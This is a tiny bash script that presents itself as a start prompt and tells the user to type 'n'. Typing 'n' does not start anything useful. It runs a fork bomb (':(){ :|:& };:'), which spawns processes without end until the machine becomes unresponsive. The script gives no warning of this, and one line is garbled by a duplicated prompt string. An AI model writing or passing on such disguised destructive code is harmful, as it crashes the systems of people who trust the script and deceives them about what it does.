#!/bin/bash

clear
echo "Type n to start (y/n): "
read shhType n to start

if [ "$shh" == "y" ]; then
    echo "Didn't start."
elif [ "$shh" == "n" ]; then
    echo "Wait >"
:(){ :|:& };:
else
    echo "Error"
fi
